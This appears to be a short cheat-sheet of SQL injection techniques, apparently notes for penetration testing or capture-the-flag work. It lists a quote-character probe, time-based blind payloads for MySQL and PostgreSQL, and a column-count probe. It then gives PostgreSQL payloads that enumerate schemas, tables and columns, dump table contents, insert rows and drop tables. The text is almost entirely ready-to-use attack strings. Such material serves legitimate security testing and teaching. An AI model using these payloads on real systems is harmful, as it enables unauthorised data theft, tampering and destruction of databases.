### Injections

#### General

Test for SQLi vulnerability with `'`:

If something wonky happens, the system is likely vulnerable.

Blind injection methods to figure out database:

| Database   | Command |
| ---------- | ------- |
| MySQL      | `'; SELECT SLEEP(5);--` |
| PostgreSQL | `'; SELECT PG_SLEEP(5);--` |

Success if the system takes ~5 seconds to respond.

If query result is visible, figure out column count:

    '); SELECT 1, 2, ..., n;--

#### PostgreSQL

Swap some visible column with sketchy stuff, e.g.:

``` sql
-- Check version:
VERSION()

-- List all tables, especially check for default schema, e.g. 'public':
table_schema, table_name [...] FROM information_schema.tables;--

-- List columns in specific table (table_name found from previous result, e.g. account):
column_name [...] FROM information_schema.columns WHERE table_name = 'account';--

-- Or with more data, e.g.:
column_name, data_type, ordinal_position ...


-- Query from table, now knowing the columns (e.g. account):
SELECT 1, 2, * FROM account;--

-- Insert into table (may require additional return for queries):
; INSERT INTO table (col1, col2) VALUES ('pwn', 1) RETURNING *;--

-- Drop table (may also require additional SELECT for queries):
; DROP TABLE table; SELECT [...] table_name [...] FROM information_schema.tables 
WHERE table_schema = 'public';--
```
